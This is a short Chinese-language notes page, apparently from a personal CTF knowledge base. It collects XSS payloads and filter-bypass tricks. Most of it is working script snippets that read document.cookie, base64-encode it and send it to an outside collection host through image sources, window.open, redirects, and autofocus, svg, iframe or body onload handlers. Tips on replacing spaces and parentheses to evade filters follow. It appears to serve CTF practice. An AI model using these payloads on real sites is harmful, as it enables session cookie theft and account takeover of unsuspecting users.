# 资源
	- [XSS平台](https://xss.pt/xss.php)
	- [XSS Payload](https://tinyxss.terjanq.me/)
- # Payloads
  id:: 62f74a8a-6cfd-4478-bfc5-505c1622b940
- ```html
  <Script>
  var img=document.createElement("img"); img.src="http://hk2.xxx.xyz:3003/"+btoa(document.cookie);
  </Script>
  ```
- ```html
  <script>window.open('http://hk2.xxx.xyz:3003/'+btoa(document.cookie))</script>
  ```
- ```html
  <script>window.location.href='http://hk2.xxx.xyz:3003/'+btoa(document.cookie)</script>
  ```
- ```html
  <script>location.href='http://hk2.xxx.xyz:3003/'+btoa(document.cookie)</script>
  ```
- ```html
  <input onfocus="window.open('http://hk2.xxx.xyz:3003/'+btoa(document.cookie))" autofocus>
  ```
	- 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
- ```html
  <input	onfocus="window.open('http://hk2.xxx.xyz:3003/'+btoa(document.cookie))"	autofocus>
  ```
- ```html
  <svg onload="window.open('http://hk2.xxx.xyz:3003/'+btoa(document.cookie))">
  ```
- ```html
  <iframe onload="window.open('http://hk2.xxx.xyz:3003/'+btoa(document.cookie))"></iframe>
  ```
- 使用tab绕过：
	- ```html
	  <iframe	onload="window.open('http://hk2.xxx.xyz:3003/'+btoa(document.cookie))"></iframe>
	  ```
- ```html
  <body onload="window.open('http://hy.xxx.xyz:3003/'+btoa(document.cookie))">
  ```
-
-
- # 绕过
- script
	- 使用上面 ((62f74a8a-6cfd-4478-bfc5-505c1622b940)) 的其他payload
- 空格
	- tab
	- `/`
- 括号
  id:: 62f7516d-1f63-4765-b37a-6f86e04d0c47
	- ```js
	  alert`1`
	  ```
- # 坑
- 有时需要让其访问127.0.0.1而不是外网地址
	- [[CTFWEB/WP/CTFShow/web330]]